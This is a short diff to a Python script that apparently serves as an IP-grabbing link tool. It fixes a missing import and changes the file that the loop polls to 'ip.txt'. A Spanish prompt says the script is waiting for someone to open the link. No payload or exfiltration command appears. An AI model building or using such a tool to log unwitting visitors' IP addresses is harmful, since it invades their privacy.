@@ -1,6 +1,7 @@
 import os
 import subprocess
 import time
+from os import path
 
 IP = "ip.txt"
 
@@ -23,7 +24,7 @@ def cat():
 def check():
     printed = False
     while True:
-      lol = path.getsize(RESULT)
+      lol = path.getsize(IP)
       if lol == 0 and printed is False:
 	  print('\n[~] Esperando a que una persona entre al link presiona ctrl+c para salir')
 	  printed = True
